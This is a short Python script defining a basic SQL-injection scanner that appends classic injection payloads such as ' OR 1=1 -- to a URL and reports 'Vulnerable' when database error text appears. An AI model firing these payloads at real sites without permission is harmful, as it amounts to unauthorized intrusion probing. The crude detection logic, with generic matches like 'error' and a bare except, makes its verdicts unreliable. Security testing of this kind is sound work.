import requests

def scan_sql(url):
    payloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "\" OR \"1\"=\"1",
        "' OR ''='"
    ]

    errors = [
        "sql syntax",
        "mysql",
        "warning",
        "error",
        "syntax error",
        "unclosed quotation",
        "odbc",
        "pdo"
    ]

    try:
        for payload in payloads:
            if "?" in url:
                test_url = url + payload
            else:
                test_url = url + "?id=" + payload

            res = requests.get(test_url, timeout=4)
            text = res.text.lower()

            for err in errors:
                if err in text:
                    return "Vulnerable"

        return "Safe"

    except requests.exceptions.Timeout:
        return "No Response"
    except:
        return "Error"